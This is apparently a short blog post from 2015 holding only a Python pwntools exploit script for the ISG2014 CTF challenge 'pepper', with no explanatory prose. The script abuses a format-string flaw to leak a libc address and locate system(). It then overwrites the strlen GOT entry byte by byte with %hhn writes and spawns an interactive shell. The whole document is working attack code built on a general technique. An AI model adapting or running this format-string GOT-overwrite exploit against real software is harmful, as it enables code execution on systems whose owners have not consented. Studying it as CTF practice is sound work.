---
layout: post
title: "isg2014-pepper-formatstring"
date: 2015-12-11 22:05:30 +0800
comments: true
categories: 
---
```python
#! /usr/bin/python
from pwn import *
from re import *
elf = ELF('./pepper')
lib = ELF('/usr/lib/libc.so.6')

p = process('./pepper')
p.recvuntil('choice:')
p.sendline('5')
p.recvuntil('edit:')
p.sendline('-2')
p.recvuntil('XD:')
p.sendline( str( elf.symbols['printf'] ) )
p.recvuntil('?')
p.sendline('n')
addr = 0x3142
print '%%%dc%%14$hhn' % ((addr+1)&0xff)
def leak( payload ):
	p.recvuntil('oice:')
	p.sendline('4')
	p.sendline(payload)
	p.sendline('1')
	p.sendline('1')
	p.sendline('1')
	p.sendline('1')
	rdata = p.recvuntil('choice')
	p.sendline('3')
	p.sendline('0')
	rdata = p.recvuntil('ch')
	if len(findall('\[\[(.*)\]\]',rdata)[0]) == 10:
		return int(findall('\[\[(.*)\]\]',rdata)[0],16)

def change( payload ):
	p.recvuntil('oice:')
	p.sendline('4')
	p.sendline(payload)
	p.sendline('1')
	p.sendline('1')
	p.sendline('1')
	p.sendline('1')
	rdata = p.recvuntil('choice')
	p.sendline('3')
	p.sendline('0')

payload  = '[[%6$p]]'
putchar_r = leak(payload) - 11
lib_base = putchar_r - lib.symbols['putchar']
system = lib_base + lib.symbols['system']
log.info('putchar: ' + hex(putchar_r))
log.info('lib_base: ' + hex(lib_base))
log.info('system: ' + hex(system))


maddr = leak('[[%25$p]]')
faddr = leak('[[%61$p]]')
offset = (faddr-maddr)/4 + 61
mid = faddr & 0xff >> 2 <<2
def write1b(addr, b1):
	global mid, offset
	change('%%%dc%%25$hhn' % (mid))
	change('%%%dd%%61$hhn' % ((addr) & 0xff ))
	change('%%%dd%%25$hhn' % (mid + 1))
	change('%%%dd%%61$hhn' % ((addr >> 8) & 0xff ))
	change('%%%dd%%25$hhn' % (mid + 2))
	change('%%%dd%%61$hhn' % ((addr >> 16) & 0xff ))
	change('%%%dd%%25$hhn' % (mid + 3))
	change('%%%dd%%61$hhn' % ((addr >> 24) & 0xff ))
	change('%%%dd%%%d$hhn' % (b1, offset))
def write4b(addr, cont):		#int
	write1b(addr, (cont) & 0xff)
	write1b(addr + 1, ((cont) >> 8) & 0xff)
	write1b(addr + 2, ((cont) >> 16) & 0xff)
	write1b(addr + 3, ((cont) >> 24) & 0xff)

addr = elf.got['strlen']
write4b(addr, system)

p.recvuntil('oice:')
p.sendline('31337')
p.sendline('sh')

p.interactive()
```
